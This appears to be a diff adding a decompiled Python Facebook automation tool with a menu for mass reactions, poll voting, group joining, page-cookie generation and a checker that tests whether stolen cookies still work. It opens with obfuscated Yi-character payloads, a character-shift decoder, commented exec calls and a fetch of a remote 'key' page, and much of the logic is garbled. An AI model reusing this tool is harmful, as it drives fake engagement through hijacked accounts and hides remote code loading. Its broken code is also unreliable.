꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚫꛈꚫꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚫꛈꚫꛎꛐꛝꛟꛪꛙꛚꛙꛐꚕꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛪꛮ꛽꛰ꛬ꛿꛰ꛪ꛾꛿ꛯ꛷꛴ꛭꛪꛮ꛺꛹꛿꛰꜃꛿ꚳ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꛈꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛱꛴꛷꛰ꛈꛮꛬꛪꛮ꛰꛽꛿꛾ꚴꚕꚫꚫꚫꚫ꜂꛴꛿꛳ꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚳꛬꛯꛯ꛽ꚷꚫ꛿꛴꛸꛰꛺꜀꛿ꛈ꛿꛴꛸꛰꛺꜀꛿ꚴꚫꛬ꛾ꚫ꛾꛺ꛮ꛶ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛴꛿꛳ꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳ꛾꛺ꛮ꛶ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈ꛳꛺꛾꛿ꚴꚫꛬ꛾ꚫ꛾꛾꛷꛾꛺ꛮ꛶ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛽ꛮ꛰꛽꛿ꚫꛈꚫ꛾꛾꛷꛾꛺ꛮ꛶ꚹ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳꛟ꛽꜀꛰ꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛏꛐꛝꛪꛮ꛰꛽꛿ꛪ꛿꛺ꛪꛛꛐꛘꛪꛮ꛰꛽꛿ꚳꛯ꛰꛽ꛮ꛰꛽꛿ꚴꚕꚕꛯ꛰꛱ꚫ꛲꛰꛿ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꛪ꛹ꛬ꛸꛰ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꛪꛮ꛺ꛯ꛰ꚴꛅꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛪꛛꛝꛚꛟꛚꛎꛚꛗꛪꛙꛌꛘꛐꛞꚹ꛲꛰꛿ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꛪꛮ꛺ꛯ꛰ꚷꚫꚲꛇ꜀꛹꛶꛹꛺꜂꛹ꛉꚲꚴꚕ'
+r = requests.Session()
+
+def getreq(X):
+    XX = { }
+    dtsg = 'NA' + re.findall('NA(.*?)"', X)[0]
+    XX.update({
+        'fb_dtsg': dtsg })
+    lsd = re.search('name="lsd" value="(.*?)"', str(X)).group(1)
+    XX.update({
+        'lsd': lsd })
+    jazo = re.search('name="jazoest" value="(.*?)"', str(X)).group(1)
+    XX.update({
+        'jazoest': jazo })
+    m_ts = re.search('name="m_ts" value="(.*?)"', str(X)).group(1)
+    XX.update({
+        'm_ts': m_ts })
+    li = re.search('name="li" value="(.*?)"', str(X)).group(1)
+    XX.update({
+        'li': li })
+    return XX
+
+
+def ExiT(XC):
+    print(XC)
+    exit()
+    [][161]
+    'STRING'.FcG == '8'
+    raise SyntaxError()
+
+
+def dec(ec):
+    dc = ''
+    for char in ec:
+        dc += chr(ord(char) - 42635)
+        return dc
+
+
+def dec(encoded_message):
+    dc = ''
+    for char in encoded_message:
+        dc += chr(ord(char) - 42635)
+        return dc
+
+#exec(dec(___order___))
+#exec(dec(___per___))
+import json
+
+def XBOX(host, port, path):
+    url = "https://approve01.blogspot.com/2024/03/key.html?m=1"
+    response = requests.get(url)
+    return response.text
+
+OFD = 'json'
+port = 443
+import _socket
+if '.so' not in _socket.__file__:
+    ExiT('')
+host = '/.' + OFD
+path = dec('꛸꜄ꚸ꛾꛰꛽꜁꛰꛽꛾ꚸꛬ꛹꛺꛹꜄꛸꛺꜀꛾ꚸꛯ꛰꛱ꛬ꜀꛷꛿ꚸ꛽꛿ꛯꛭꚹ꛱꛴꛽꛰ꛭꛬ꛾꛰꛴꛺ꚹꛮ꛺꛸')
+response = XBOX(host, port, path)
+#ExiT('[+] Turn Off Bluetooth')
+
+def extract_json(response):
+    start_index = response.find('{')
+    json_string = response[start_index:]
+    json_data = json.loads(json_string)
+    return json_data
+
+W = '\x1b[1;97m'
+G = '\x1b[1;92m'
+R = '\x1b[1;91m'
+S = '\x1b[1;96m'
+B = '\x1b[1;94m'
+Y = '\x1b[1;93m'
+P = '\x1b[1;95m'
+ugen = []
+modd = [
+    'SM-G950F',
+    'SM-G975F',
+    'SM-G970F',
+    'SM-G920V',
+    'hyper',
+    'E',
+    'SM-T510',
+    'LITE',
+    '5',
+    'ELE-L29',
+    'ANE-LX1',
+    '2',
+    'SM-A715F',
+    'SM-G965F',
+    'SM-A307FN',
+    'DUB-LX1',
+    'SM-G570F',
+    'SM-G988U1',
+    'SM-A750F',
+    'STK-L21',
+    'SM-N920C',
+    'SM-G965F',
+    'SM-F907B',
+    'VOG-L09',
+    'MRD-LX1F',
+    'LIO-N29',
+    'SM-N960F',
+    'MRX-W09',
+    'LYA-L29',
+    'SM-J700M',
+    'Lite',
+    'LEX626',
+    'iris50',
+    'SM-A307FN',
+    'CPH1903',
+    '5',
+    'LIO-N29',
+    '8',
+    'F1',
+    'Lite',
+    'SM-A105F',
+    'S3_Pro',
+    'ASUS_X00ID',
+    'RMX1811',
+    'MHA-L29',
+    'SM-G965U',
+    'Pro',
+    'SM-A260G',
+    'SM-G965F',
+    'cp3648AT',
+    'SM-A750F',
+    'Pro',
+    '1727',
+    'SM-G975F',
+    'SM-G985F',
+    '2',
+    'X655C',
+    'Pro',
+    'SM-A015F',
+    '7',
+    'YAL-L21',
+    'SM-A505FN',
+    'SM-G570Y',
+    'SM-G570F',
+    'SM-A920F',
+    'SM-A307FN',
+    'RMX1901',
+    'LYA-L29',
+    'SM-G975F',
+    'RMX1911',
+    'SM-G570M',
+    'LDN-L21',
+    'SM-S920L',
+    'Nomi_C070020',
+    'SM-N975F',
+    'SM-G960F',
+    'STK-L21',
+    '5',
+    'SM-N900',
+    'SM-N770F',
+    'SM-A705FN',
+    'SM-A205U',
+    '2',
+    'CPH1923',
+    'VNS-L31',
+    'LDN-L21',
+    'RMX1825',
+    'LM-Q710(FGN)',
+    'A3003',
+    'EML-L29',
+    'SM-G570M',
+    'SM-A107F',
+    'macro',
+    'BMM441S',
+    'F1',
+    'SM-A605F',
+    'SM-N975F',
+    'LYA-L29',
+    'Pro',
+    'SM-A205U',
+    'SM-G988U',
+    'KYOCERA-E6560',
+    'SM-G975U',
+    '10',
+    'SM-G930T',
+    'SM-A920F',
+    'FRD-L09',
+    'SM-J510F',
+    'LM-X320',
+    '8',
+    'RMX1911',
+    'POT-LX1',
+    'SM-G960F',
+    '1901',
+    '(XT2005DL)',
+    'SM-A530F',
+    'SM-A505FN',
+    'SM-G975F',
+    'SM-G960U',
+    '5',
+    'Pro',
+    'SM-A530F',
+    'SM-A720F',
+    'Lite',
+    'X626B',
+    'MAR-LX1M',
+    '7',
+    'FIG-LA1',
+    'Pro',
+    'SM-N975F',
+    'MRX-AL09',
+    'Neffos_C9',
+    'CPH1613',
+    'SM-A307FN',
+    '1807',
+    'LM-X320',
+    'SM-G950F',
+    'RMX1825',
+    'SM-N9750',
+    'ASUS_I001DE',
+    'IN2020',
+    'SM-G975U',
+    'SM-G950U1',
+    'SM-M105F',
+    'VOG-L29',
+    'MHA-L29',
+    'M2007J20CG',
+    'VTR-L29',
+    'A1',
+    '8',
+    'SM-G950U1',
+    'ARE-L22HN',
+    'CPH1819',
+    'SM-G610F',
+    'SM-J337P',
+    'SM-J610F',
+    'SM-G960F',
+    'SM-N986B',
+    'SM-G955F',
+    'ASUS_I001DC',
+    'SM-N960F',
+    'SM-A307GN',
+    'SM-T580',
+    'SM-G550FY',
+    'SM-G975U',
+    'SM-A705FN',
+    'SM-A505F',
+    'Pro',
+    'CPH2127',
+    'CPH1819',
+    'SM-G975F',
+    '6',
+    'Pro',
+    'Plus',
+    'JAT-L41',
+    'G3116',
+    'ASUS_X00TD',
+    'SM-A515F',
+    'W-V720-EEA',
+    'SM-T285YD',
+    'KC2',
+    'dandelion',
+    'ANE-LX1',
+    'RMX1821',
+    '9S',
+    'SM-J701F',
+    'YAL-L21',
+    'SM-P610',
+    'SM-G570M',
+    'SM-N960U1',
+    'SM-G960U',
+    'SM-M305F',
+    'SM-J730F',
+    'SM-G615F',
+    '6A',
+    'SM-G955U',
+    'SM-G610F',
+    'CPH2137',
+    '3.2',
+    'PRA-LA1',
+    'GM1913',
+    'SM-N950F',
+    'SM-A107F',
+    'SM-G930W8',
+    'SM-A105M',
+    'SM-M215F',
+    'RMX2027',
+    'SM-G973W',
+    'T5',
+    'MAR-LX1M',
+    'Pro',
+    'SM-A207F',
+    '1904',
+    'SM-N986B',
+    'SM-G532M',
+    'CAN-L01',
+    'CPH1937',
+    '1906',
+    'SLA-L22',
+    'SM-N950W',
+    'Pro',
+    'E502',
+    '1904',
+    'SM-A605FN',
+    'SM-N920C',
+    'SM-A107M',
+    'SM-J330G',
+    'JKM-LX1',
+    'CPH2083',
+    'SM-G973F',
+    'JSN-L22',
+    'SM-A102U',
+    '1811',
+    'LG-X240',
+    '1901',
+    'SM-M317F',
+    'CPH1923',
+    'Vita',
+    'SM-A920F',
+    'CPH1909',
+    'SM-G975U',
+    'SM-G532M',
+    'CPH1941',
+    '1901',
+    'SM-A515F',
+    'power',
+    'SM-J320G',
+    'KC2',
+    'CPH1823',
+    '8',
+    'GM1913',
+    'SM-G960F',
+    'PB2-670M',
+    'SM-A307FN',
+    'SM-T510',
+    'GT-I9300',
+    'COL-L29',
+    'SM-A600FN',
+    'COR-L29',
+    'SM-N950F',
+    '3.2',
+    'SM-F916B',
+    'Pro',
+    'SM-G975U',
+    'F18',
+    'INE-LX1',
+    'SM-N920C',
+    'SM-A305F',
+    'COL-L29',
+    'HMA-L29',
+    'G8141',
+    'HRY-LX1',
+    'CPH1911',
+    'XQ-AT52',
+    'NX659J',
+    '10T',
+    'SM-G950U1',
+    'SM-G610F',
+    '1915',
+    'EML-L29',
+    'SM-G611MT',
+    'F1',
+    '1907',
+    'EML-L29',
+    'SM-E700H',
+    'SM-A105F',
+    'LG-H871S',
+    'SM-A207F',
+    'SM-G925F',
+    'RMX1992',
+    '1804',
+    'JSN-L42',
+    'Pro',
+    'KD7h',
+    '1726',
+    '8',
+    'SM-M215F',
+    'SM-A505F',
+    'JSN-L21',
+    'SM-N960F',
+    'VNS-L21',
+    '8',
+    'RMX1805',
+    'SM-A105M',
+    'X2',
+    'Pro',
+    'LG-M700',
+    'MRD-LX1F',
+    'ASUS_Z012DC',
+    'PGN528',
+    'Pro',
+    'SM-A705FN',
+    'CPH1931',
+    '1933',
+    'Max',
+    'STK-LX1',
+    '1920',
+    'SM-A605F',
+    'SM-N976Q',
+    'VOG-L29',
+    'X3',
+    '507SH',
+    'SM-T510',
+    'SM-N986B',
+    'SM-G973F',
+    'SM-G975F',
+    'M2003J15SC',
+    'C11_Pro',
+    'SM-M515F',
+    'M2007J20CG',
+    'JSN-L22',
+    'SM-A305F',
+    'SM-N950F',
+    'SM-G960F',
+    'M2011K2C',
+    '9000RU',
+    'CPH1951',
+    'SM-N970F',
+    'sim',
+    '7',
+    'LG-K350',
+    'LM-X420',
+    '9T',
+    'SM-N975F',
+    'MAR-LX1H',
+    'SM-A115A',
+    'LTE',
+    'SLA-L22',
+    'GM1900',
+    'SM-T380',
+    'LLD-L31',
+    'SM-A515F',
+    'M2006C3LG',
+    'VOG-L09',
+    'SM-J730FM',
+    'X52X',
+    '1811',
+    'SM-N960F',
+    'SM-A107M',
+    'SM-A505FN',
+    'SM-N950F',
+    'A3',
+    'em_t8350_emmc',
+    'LDN-L21',
+    'Lite',
+    'SM-A920F',
+    'SM-T720',
+    '4',
+    'CPH1819',
+    'SM-A705FN',
+    'Pro',
+    '6.1',
+    'DRA-LX9',
+    'SM-G975U',
+    'JAT-LX1',
+    'Pro',
+    'X2',
+    'VOG-L29',
+    'CPH2059',
+    'Pro',
+    'LIO-L29',
+    'LIO-L29',
+    'SM-G975F',
+    'SM-N960F',
+    'SM-G970F',
+    'SM-A705FN',
+    'SM-G975U',
+    'SM-M105F',
+    'SM-N986B',
+    'RMX1931',
+    'SM-J730FM',
+    'Pro',
+    'SM-A525F',
+    'SM-G988B',
+    'SM-G965F',
+    'SM-N970F',
+    'SM-A405FM',
+    'RMX2170',
+    'SM-G973F',
+    'SM-G570F',
+    '9T',
+    'CPH2185',
+    'AGS2-L09',
+    'SM-G973F',
+    'Pro',
+    'DMC-CM1',
+    'ANE-LX3',
+    'SM-G960F',
+    'SM-J810G',
+    'M2101K9G',
+    'Pro',
+    '8',
+    'SM-N976Q',
+    'L38012',
+    'LG-K220',
+    'Ultra',
+    'Plus',
+    'Pro',
+    'SM-G973F',
+    'SM-A107M',
+    'EVR-N29',
+    '1951',
+    'SM-N950F',
+    'SM-A515F',
+    'SM-J610F',
+    'X2',
+    'SM-J720F',
+    '4X',
+    'YAL-L41',
+    'RMX2086',
+    'CPH2201',
+    'SM-A115U',
+    'SM-G955F',
+    'SM-A307FN',
+    '1951',
+    'HD1901',
+    '7S',
+    'SM-A305F',
+    'CPH2083',
+    'iPlay_20',
+    'MAR-LX1A',
+    'SM-G981U',
+    'RMX2086',
+    '8T',
+    'Lite',
+    'SM-A125U',
+    '2.2',
+    'SM-J730FM',
+    '5.3',
+    'SM-M215F',
+    '9S',
+    'SM-A115A',
+    'AC2003',
+    'L38111',
+    'JNY-LX1',
+    'Pro',
+    'A6000',
+    'NX669J',
+    'X2',
+    'SM-F415F',
+    'PRA-TL10',
+    'SM-N975F',
+    'SM-G998B',
+    'CPH2065',
+    '1907',
+    '3.4',
+    'SM-N986B',
+    'CPH1909',
+    'SM-G965U1',
+    'BE2025',
+    'SM-J730FM',
+    'M2007J20CG',
+    'VOG-L29',
+    'SM-T720',
+    'KB2001',
+    'SM-G950F',
+    'LDN-L21',
+    'SM-A105M',
+    'SM-N950F',
+    'AMN-LX9',
+    'SM-S367VL',
+    'JKM-LX3',
+    '5048U',
+    'P027',
+    'DRA-LX9',
+    'STK-L21',
+    'M2102J20SG',
+    'M2012K11AG',
+    'Pro',
+    '9T',
+    'SM-G988U',
+    'LLD-AL00',
+    'CPH2065',
+    'X2',
+    'CPH1931',
+    'SM-G965F',
+    'LDN-L21',
+    '8',
+    'LM-V409N',
+    'LLD-L31',
+    'HMA-L29',
+    '7.2',
+    'RMX1921',
+    'ZB602KL',
+    'CPH2185',
+    'INE-LX1',
+    'ANE-LX1',
+    'STK-LX1',
+    'A6003',
+    'SM-A720F',
+    'YAL-L21',
+    '1933',
+    'ASUS_Z012S',
+    'H4213',
+    'SM-N986U',
+    'JNY-LX1',
+    'CPH2065',
+    'SM-A515F',
+    'SM-A207F',
+    'vernee_M5',
+    '1611',
+    'SM-T500',
+    'KB2007',
+    'JNY-LX2',
+    'AMN-LX9',
+    'MRD-LX1F',
+    'SNE-LX1',
+    'SM-N975U',
+    '1814',
+    '1902',
+    '7',
+    'HRY-LX2',
+    'SM-F711B',
+    'FIG-LX1',
+    'M2010J19CG',
+    'DUB-LX1',
+    'plus',
+    'SM-A115A',
+    'W109',
+    'SM-N960F',
+    'Pro',
+    'M2010J19CG',
+    'JSN-L22',
+    'SM-A715F',
+    'SM-A015F',
+    'SNE-LX1',
+    'G8142',
+    'SO-05K',
+    'SM-A107F',
+    'SM-A730F',
+    'Pro',
+    'A3',
+    'Max',
+    'HD1907',
+    'CPH1901',
+    'CPH2239',
+    'LDN-L21',
+    'SM-A202F',
+    'CPH2127',
+    'SM-A526B',
+    'SM-A505YN',
+    'CPH1909',
+    'M2004J19C',
+    'SM-A715W',
+    'SM-A530F',
+    '4a',
+    'SM-A125F',
+    'Pro',
+    'Pro',
+    'SM-A515W',
+    'M2007J20CG',
+    'STK-L21',
+    'SM-A600FN',
+    'SM-J400F',
+    'M2101K7BG',
+    'Lite',
+    'POT-LX3',
+    'SM-T585',
+    '1818',
+    'SM-J610G',
+    'RMX2040',
+    'A3000',
+    'RMX1971',
+    'RMX1971',
+    'SM-A107M',
+    'SM-A217F',
+    'SM-G988B',
+    'KONG',
+    'SM-N981U',
+    'SM-F711B',
+    'M2010J19CG',
+    'AC2001',
+    'SM-A405FN',
+    'ANE-LX1',
+    'PRA-LA1',
+    'XL',
+    'PPA-LX3',
+    'TB-X606F',
+    'SM-N950F',
+    'SM-A125F',
+    'SM-A710F',
+    'SM-A105M',
+    'M2102K1G',
+    'F1',
+    '1901',
+    'ELE-L29',
+    'V2061',
+    '8A',
+    'SM-N960F',
+    'PRA-LA1',
+    '1921',
+    'SM-G988B',
+    'macro',
+    'Lite',
+    '8',
+    'SM-J730FM',
+    'Pro',
+    'SM-A605FN',
+    'SM-J610F',
+    'STK-LX1',
+    'Pro',
+    'CPH1907',
+    'ZB602KL',
+    'M2004J19C',
+    'CPH1937',
+    '1823',
+    'CPH1613',
+    'AMN-LX9',
+    'POT-LX1AF',
+    'MHA-AL00',
+    '1817',
+    'M2010J19CG',
+    'RMX2020',
+    'Pro',
+    'NX510J',
+    'SM-A325F',
+    '1727',
+    'Lite',
+    'SM-G928T',
+    'Play',
+    'ANE-LX1',
+    'power',
+    'ASUS_Z01HD',
+    'PAR-LX9',
+    'SM-A600FN',
+    'SM-A125U1',
+    'Phone',
+    'JSN-L21',
+    'Pro',
+    'Pro',
+    'CPH2119',
+    'RMX3081',
+    'YAL-L21',
+    'SM-M515F',
+    'SM-A715F',
+    'SM-M205F',
+    'SM-A715F',
+    'V2027',
+    'JKM-LX1',
+    'X682C',
+    'LIO-L29',
+    'CAM-L21',
+    'SM-A705FN',
+    'Armor_6E',
+    'YAL-L21',
+    'SM-A125F',
+    'BLN-L21',
+    'DUA-LX9',
+    'V2025',
+    'MHA-L29',
+    'Pro',
+    'SM-A125F',
+    'SM-J600F',
+    'SM-J600F',
+    'CPH1941',
+    'BASIC',
+    'SM-A225F',
+    'RMX2185',
+    'KSA-LX9',
+    '8',
+    '1906']
+for xd in range(5):
+    rr = random.randint
+    um4 = f'''Mozilla/5.0 (Linux; Android {random.choice(modd)} Build/{rr(1111, 9999)}.0.0{rr(10, 90)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30, 80))}.0.{str(rr(4900, 5700))}.{str(rr(70, 150))}  Mobile Safari/537.36'''
+    main_ua = um4
+    ugen.append(main_ua)
+    
+    def clear():
+        os.system('clear')
+        print(logo)
+
+    
+    def linex():
+        print('\x1b[1;97m--------------------------------------------------')
+
+    logo = f'''\x1b\033[1;32m------------------------------------------------
+   ____               _  _____  _ __       
+  / __/__  ___  __ __| |/_/ _ \(_) /  __ __
+ _\ \/ _ \/ _ \/ // />  </ ___/ / _ \/ // /
+/___/\___/_//_/\_,_/_/|_/_/  /_/_//_/\_,_/ 
+\033[1;32m--------------------------------------------------
+\033[1;37m[-] AUTHOR    :\033[1;32m Sonu Nigham 
+\033[1;37m[-] GITHUB    :\033[1;32m none
+\033[1;37m[-] VERSION   :\033[1;32m 1.5
+\033[1;37m[-] STATUS    :\033[1;32m PREMIUM
+--------------------------------------------------'''
+    
+    def VOTE():
+        clear()
+        print('[1] Auto Reaction ')
+        print('[2] Genrate Page ')
+        print('[3] Voting System')
+        print('[4] Cookie Live Died Checker')
+        print('[5] Remove Duplicate Pages')
+        print('[6] Join Group Method ')
+        print('[0] Exit Menu')
+        linex()
+        XFXF = input('[?] Select Option : ')
+        if XFXF == '1':
+            like()
+        if XFXF == '2':
+            genpage()
+        if XFXF == '3':
+            voting()
+        if XFXF == '4':
+            live()
+        if XFXF == '5':
+            clear()
+            file = input('[+] File : ')
+            os.system('sort -r ' + file + ' | uniq > 123')
+            os.system('mv 123 ' + file)
+        if XFXF == '6':
+            clear()
+            print('[1] Choose Group')
+            linex()
+            hhh = input('[?] Select Option : ')
+            clear()
+            if hhh == '1':
+                link = input('[+] Link: ')
+            link = 'https://www.facebook.com/groups/887609499760991/'
+            fileG = input('[+] File: ')
+            print('------------------------------------------------')
+            for ttt in open(fileG).read().splitlines():
+                _thread.start_new_thread(sgjp, (ttt, link))
+                time.sleep(0)
+                time.sleep(47866)
+                return None
+                return None
+
+    
+    def sgjp(cookie, link):
+        cookies = {
+            'cookie': cookie }
+        uid = re.findall('i_user=(.*?);', cookies['cookie'])[0]
+        host = 'https://m.facebook.com/'
+        heads = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1534.112 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352..0.0.7.110;FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]' }
+        res = requests.get(url = host, cookies = cookies, headers = heads).text
+        j2 = re.search('name="jazoest" value="([^"]+)"', res).group(1)
+        fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', res).group(1)
+        print('[+] Failed! ' + uid)
+        return '0'
+        lsd = re.search('name="lsd" value="([^"]+)"', res).group(1)
+        lsd = ''
+        gid = re.findall('groups/(.*?)/', link)[0]
+        headers = {
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'viewport-width': '891',
+            'x-asbd-id': '129477',
+            'x-fb-friendly-name': 'GroupCometJoinForumMutation',
+            'x-fb-lsd': lsd }
+        data = {
+            '__spin_r': '1010986465',
+            '__spin_b': 'trunk',
+            '__spin_t': '1706093643',
+            'qpl_active_flow_ids': '431626709',
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
+            'variables': '{"feedType":"DISCUSSION","groupID":"' + gid + '","imageMediaType":"image/x-auto","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1706093645665,970349,2361831622,,","group_id":"' + gid + '","group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":false},"actor_id":"' + uid + '","client_mutation_id":"1"},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"scale":3,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":false}',
+            'server_timestamps': 'true',
+            'doc_id': '7732956370117476',
+            'fb_api_analytics_tags': '["qpl_active_flow_ids=431626709"]' }
+        response = requests.post('https://web.facebook.com/api/graphql/', cookies = cookies, headers = headers, data = data)
+        print('[+] Pending/Joined The Group : ' + uid)
+
+    
+    def live():
+        clear()
+        file = open(input('[+] File Name: '))
+        Ids = file.read().splitlines()
+        for idd in Ids:
+            u = requests.get('https://mbasic.facebook.com', cookies = {
+                'cookie': idd })
+            re.findall('mbasic_logout_button', u.text)[0]
+            print('\x1b[1;92m[✓] Live ')
+            print('\x1b[1;91m[×] Died')
+            return None
+
+    clear()
+    totalpage = 0
+    
+    def SavePage(cookies, FileOut):
+        global totalpage
+        hadd = {
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'viewport-width': '980' }
+        headers['user-agent'] = random.choice(ugen)
+        params = {
+            'category': 'your_pages',
+            'ref': 'bookmarks' }
+        XF = requests.get('https://web.facebook.com/pages/', params = params, cookies = cookies, headers = hadd)
+        lists = re.findall('"profile":{"id":"(.*?)"', XF.text)
+        unique_list = list(set(lists))
+        for uid in unique_list:
+            if cookies['cookie'].endswith(';'):
+                pass
+            cookies['cookie'] = cookies['cookie'] + ';'
+            cookiess = str(cookies['cookie']) + 'i_user=' + str(uid) + ';'
+            open(FileOut, 'a').write(cookiess + '\n')
+            totalpage += 1
+            print('[+] total pages : ' + str(totalpage))
+            return None
+
+    
+    def genpage():
+        clear()
+        FileX = input('[+] Input Ids File: ')
+        FileOut = input('[+] File Save As : ')
+        print('----------------------------------------')
+        tpe = thread(max_workers = 1000)
+        for i in open(FileX).read().splitlines():
+            cookies = i
+            if 'sb=' not in cookies:
+                cookies = 'sb=iamvip' + cookies
+            cookies = {
+                'cookie': cookies }
+            tpe.submit(SavePage, cookies, FileOut)
+            None(None, None)
+            return None
+            if not None:
+                pass
+
+    hds = {
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+        'viewport-width': '980' }
+    
+    def voting():
+        clear()
+        cookies = {
+            'cookie': input('[•] Past Cookies : ') }
+        clear()
+        dpeed = input('[+] Speed: ')
+        pst = input('[•] input Post Link : ')
+        xd = requests.get(pst.replace('www', 'mbasic').replace('web.f', 'mbasic.f').replace('m.fac', 'mbasic.fac'), cookies = cookies, headers = {
+            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.0.0;  Build/96.1.A.0.884) [FBAN/FB4A;FBAV/111.592.371.596;FBBV/591968038;FBDM/{density=560,width=720,height=1640};FBLC/en_US;FBCR/MetroPCS;FBMF/samsung;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/;FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]',
+            'accept-language': 'en-US' })
+        clear()
+        file = input('[•] File Path: ')
+        hds['referer'] = pst
+        txts = re.findall('class="(?:.*?)" title="(.*?)"><div', xd.text)
+        oids = re.findall('oid=(.*?)&amp;', xd.text)
+        TXT = zip(oids, txts)
+        clear()
+        for id, text in TXT:
+            if len(id + text) < 100:
+                print('[•] ' + id + ' : ' + text + '')
+            print()
+            optid = input('[+] Put id : ')
+            clear()
+            pid = re.findall('id="text(.*?)"><div clas', xd.text)[0]
+            pid = re.findall('question_id=(.*?)&amp;', xd.text)[0]
+            for i in open(file).read().splitlines():
+                cookies = i
+                uid = re.findall('i_user=(.*?);', cookies)[0]
+                uid = re.findall('c_user=(.*?);', cookies)[0]
+                if 'sb=' not in cookies:
+                    cookies = 'sb=iamvip' + cookies
+                cookies = {
+                    'cookie': cookies }
+                XD = threading.Thread(target = start, args = (uid, cookies, pst, optid, pid))
+                XD.start()
+                XD.join()
+                time.sleep(0)
+                time.sleep(20000)
+                return None
+
+    
+    def like():
+        global ids, ids
+        os.system('clear')
+        clear()
+        dpeed = input('[+] Speed: ')
+        file = input('[+] Ids File Path : ')
+        post = input('[+] Post Link : ')
+        print('[1] LIKE\n[2] LOVE\n[3] HAHA\n[4] WOW\n[5] SAD\n[6] ANGRY\n[7] CARE')
+        react = input('[+] Reaction: ')
+        print('---------------------------------------------')
+        rids = {
+            '1': '1635855486666999',
+            '2': '1678524932434102',
+            '3': '115940658764963',
+            '4': '478547315650144',
+            '5': '908563459236466',
+            '6': '444813342392137',
+            '7': '613557422527858' }
+        react = rids.get(react)
+        postid = re.findall('posts/(.*?)/', post)[0]
+        postid = re.findall('permalink/(.*?)/', post)[0]
+        postid = base64.b64encode(('feedback:' + postid).encode()).decode()
+        tpe = thread(max_workers = int(dpeed))
+        for i in open(file).read().splitlines():
+            (ids, pas, cookies) = i.split('|')
+            cookies = i
+            cookies = ';' + cookies
+            ids = re.findall('i_user=(.*?);', cookies)[0]
+            tpe.submit(REACTX, ids, cookies, postid, react)
+            None(None, None)
+            return None
+            if not None:
+                pass
+
+    
+    def REACTX(ids, coki, postid, react):
+        cookies = {
+            'cookie': coki }
+        host = 'https://m.facebook.com/'
+        heads = {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1534.112 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352..0.0.7.110;FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]' }
+        res = requests.get(url = host, cookies = cookies, headers = heads).text
+        j2 = re.search('name="jazoest" value="([^"]+)"', res).group(1)
+        fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', res).group(1)
+        return 0
